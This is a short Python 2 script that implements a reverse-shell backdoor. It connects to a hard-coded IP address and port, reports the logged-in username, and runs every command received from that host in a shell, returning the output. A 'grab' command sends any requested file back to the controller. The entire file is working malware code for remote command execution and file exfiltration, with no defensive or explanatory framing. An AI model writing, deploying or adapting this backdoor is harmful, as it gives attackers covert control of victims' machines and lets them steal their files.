import getpass
import socket
import subprocess
import os


def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else:
        s.send("Unable to find file")


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('172.26.44.222', 1996))
    s.send(getpass.getuser())

    while True:
        command = s.recv(1024)
        if 'terminate' in command:
            s.close()
            break

        elif 'grab' in command:
            grab, path = command.split("*")
            try:
                transfer(s, path)
            except Exception, e:
                s.send(str(e))
                pass

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read() + "\n"+CMD.stderr.read())  # sending the result
            s.send('DONE')
            # s.send()  # in case there is a typo by server side


def main():
    connect()


main()
